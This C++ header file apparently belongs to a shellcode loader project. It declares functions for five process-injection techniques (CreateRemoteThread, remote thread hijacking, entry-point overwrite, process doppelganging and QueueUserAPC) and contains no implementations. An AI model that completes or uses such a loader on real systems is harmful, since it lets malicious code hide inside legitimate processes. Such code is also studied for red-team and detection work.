#ifndef ABLELDR_EXECUTE_HPP
#define ABLELDR_EXECUTE_HPP
#include <Windows.h>
#include "malapi.hpp"

namespace execute
{
	//
	// Process Injection
	//
	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);

	//
	// Remote Thread Hijacking
	//
	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);

	//
	// InjectionAddressOfEntryPoint Injection
	//
	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);

	//
	// Process InjectionDoppleganger
	//
	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);

	//
	// QueueUserApc Injection
	//
	BOOL InjectionQueueUserInject(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
} // End of execute namespace

#endif
